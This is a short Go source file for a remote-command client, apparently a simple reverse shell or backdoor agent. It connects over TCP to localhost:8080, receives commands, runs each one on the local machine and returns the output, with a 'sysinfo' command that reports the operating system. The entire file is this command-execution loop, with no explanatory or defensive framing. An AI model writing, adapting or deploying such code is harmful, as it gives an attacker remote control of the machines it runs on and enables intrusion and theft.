package main

import (
	// Standard
	"strings"
	"fmt"
	"encoding/gob"
	"log"
	"net"
	"os/exec"
	"runtime"
)


func main() {

	conn, err := net.Dial("tcp", "localhost:8080")

	if err != nil {
		log.Fatal("Connection failled with", err)
	}

	cmd := ""
	dec := gob.NewDecoder(conn)
	enc := gob.NewEncoder(conn)

	for cmd != "close" {

		//cmd, _ = bufio.NewReader(conn).ReadString('\n')

		dec.Decode(&cmd)
		cmd = strings.TrimSuffix(cmd, "\n")
			
	
		switch {
		case cmd == "close":
			break

		case cmd == "sysinfo":
			osType := runtime.GOOS
			enc.Encode(osType)

		default:
			out, err := exec.Command(cmd).Output()
		
			if err != nil {
				fmt.Println("", err)
			}

			output := string(out[:])
			enc.Encode(output)
		}	
	}
	conn.Close()
}
